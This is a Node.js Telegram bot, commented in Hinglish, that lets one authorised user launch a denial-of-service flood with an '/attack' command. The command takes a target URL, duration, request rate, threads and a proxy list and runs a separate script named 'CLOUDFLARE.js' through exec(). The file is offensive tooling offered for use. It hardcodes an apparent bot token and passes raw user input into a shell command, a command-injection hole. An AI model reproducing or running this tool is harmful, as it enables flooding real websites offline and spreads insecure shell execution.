const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Apna Telegram Bot Token yahan dalein (BotFather se lein)
const token = '8317760381:AAEaeIMnLd58kAhiAe2iihY0rHsy2efD0so';
const bot = new TelegramBot(token, { polling: true });

// Authorized User ID (Sirf aap hi command chala sakein)
const adminId = 7793525110; 

bot.onText(/\/attack (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Check if user is admin
    if (userId !== adminId) {
        return bot.sendMessage(chatId, "❌ Aapke paas permission nahi hai!");
    }

    const target = match[1]; // URL
    const time = match[2];   // Duration
    const rps = match[3];    // Rate per second
    const threads = match[4]; // Threads
    const proxy = match[5];  // Proxy file (e.g., proxy.txt)

    bot.sendMessage(chatId, `🚀 Attack Start ho gaya hai!\n🎯 Target: ${target}\n⏱ Time: ${time}s`);

    // CLOUDFLARE (1).js script ko execute karna
    const command = `node "CLOUDFLARE.js" ${target} ${time} ${rps} ${threads} ${proxy}`;

    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
            return;
        }
        bot.sendMessage(chatId, `✅ Attack Khatam: \n${stdout}`);
    });
});

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome! Attack start karne ke liye ye format use karein:\n/attack [target] [time] [rps] [threads] [proxy]");
});
